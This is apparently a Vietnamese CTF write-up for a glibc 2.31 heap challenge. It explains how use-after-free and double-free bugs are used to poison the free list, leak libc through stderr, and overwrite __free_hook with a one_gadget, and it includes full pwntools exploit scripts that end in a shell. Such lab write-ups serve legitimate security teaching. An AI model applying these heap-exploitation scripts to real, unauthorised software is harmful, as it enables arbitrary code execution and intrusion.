# Chall1 2.31

- Đề bài cho ta 1 file libc , 1 file binary và file linker
- Đầu tiên ta mở ida xem thử

![](https://i.imgur.com/iwf6RHi.png)

- Nó sẽ in cho ta lần lượt các option và bắt ta lựa chọn, 1 để cấp phát động bằng `malloc()`, 2 để viết vào địa chỉ được cấp phát, 3 để free(), 4 để đọc thông tin ở địa chỉ đó
- Code có các lỗi sau : use after free và double free.
- Tiếp theo checksec để tìm hướng giải: 

![](https://i.imgur.com/LD3tqyv.png)

- Ta thấy full RELRO đồng nghĩa với overwrite GOT không khả thi. Dựa vào những chall dream hack trước kia thì ta có 2 địa chỉ ở libc (bản 2.31) vẫn còn quyền write: `stderr`, và `__free_hook`
- Do đó hướng làm hiện tại là leak libc bằng `stderr` và overwrite `__free_hook` thành `one_gadget`
- Nếu ta free 2 lần liên tiếp thì sẽ báo lỗi, do đó ta sẽ lợi dụng use after free để overwrite ptr được cấp phát thành null byte.
![](https://i.imgur.com/ByLE1qC.png).

- Mục tiêu chính của ta là overwrite `fd` thành địa chỉ ta muốn. Sở dĩ ta làm vậy vì khi ta `free` một địa chỉ, thì phần data của địa chỉ đó sẽ được sử dụng trong fastbin của linklist

![](https://i.imgur.com/DkYOhPA.png)

- Khi ta yêu cầu cấp phát bộ nhớ bằng `malloc()`, nó sẽ check bộ nhớ trong bin trước, khi ta overwrite fd bằng use after free, ta sẽ trick malloc tưởng địa chỉ ta overwrite là địa chỉ có thể cấp phát được.
- Do đó đầu tiên ta leak libc :

```python
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'aaaaaaaa')
p.sendlineafter(b"> ",b'3')

#ow-data-to-bypass-double-free-error
p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',b'\x00'*16)

#double-free
p.sendlineafter(b"> ",b'3')

p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',p64(exe.sym['stderr']))

#get-new-ptr-until-get-our-ow-ptr
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'bbbbbbb')


#leak-libc
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendafter(b"Content: ",b'\xc0')

p.sendlineafter(b"> ",b'4')
p.recvuntil(b'Content: ')

leak = u64(p.recvline()[:-1]+b'\x00\x00')
libc.address = leak - 2021056 + 256
print("leak = ",hex(libc.address))
```

Trong script này, ta lợi dụng UAF để bypass lỗi double free, sau đó ta sài double free để OW fd thành `stderr` và dùng nó để leak libc bằng option thứ 4.

Sau đó ta OW `__free_hook` thành `one_gadget`.
```python
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'aaaaaaaa')
p.sendlineafter(b"> ",b'3')

#ow-data-to-bypass-double-free-error
p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',b'\x00'*16)

#double-free
p.sendlineafter(b"> ",b'3')

p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',p64(libc.sym['__free_hook']))

p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'ccccccc')

p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendafter(b"Content: ",p64(libc.address + 0xe3b01))

p.sendlineafter(b"> ",b'3')
```

- Trong đoạn script này ta phải cấp phát một địa chỉ mới do địa chỉ cũ (tức stderr) khi `free` sẽ bị lỗi. Với địa chỉ mới đó ta làm tương tự các bước như trên để double free lấy được địa chỉ `__free_hook` và ghi vào nó `one_gadget`. Khi ấy `free()` đã bị overwrite thành địa chỉ ta muốn nên chỉ cần chọn option 3 để call lấy shell.

- Full Script:
```python 
from pwn import *
exe = ELF("chall1_patched")
libc = ELF("libc.so.6")
p=process(exe.path)
#create-first-ptr
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'aaaaaaaa')
p.sendlineafter(b"> ",b'3')

#ow-data-to-bypass-double-free-error
p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',b'\x00'*16)

#double-free
p.sendlineafter(b"> ",b'3')

p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',p64(exe.sym['stderr']))

#get-new-ptr-until-get-our-ow-ptr
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'bbbbbbb')


#leak-libc
p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendafter(b"Content: ",b'\xc0')

p.sendlineafter(b"> ",b'4')
p.recvuntil(b'Content: ')

leak = u64(p.recvline()[:-1]+b'\x00\x00')
libc.address = leak - 2021056 + 256
print("leak = ",hex(libc.address))

p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'aaaaaaaa')
p.sendlineafter(b"> ",b'3')

#ow-data-to-bypass-double-free-error
p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',b'\x00'*16)

#double-free
p.sendlineafter(b"> ",b'3')

p.sendlineafter(b"> ",b'2')
p.sendlineafter(b'Content: ',p64(libc.sym['__free_hook']))

p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendlineafter(b"Content: ",b'ccccccc')

p.sendlineafter(b"> ",b'1')
p.sendlineafter(b"Size: ",b'32')
p.sendafter(b"Content: ",p64(libc.address + 0xe3b01))

p.sendlineafter(b"> ",b'3')
p.interactive()
```

![](https://i.imgur.com/QVGGa42.png)

- Chạy thử và ta có shell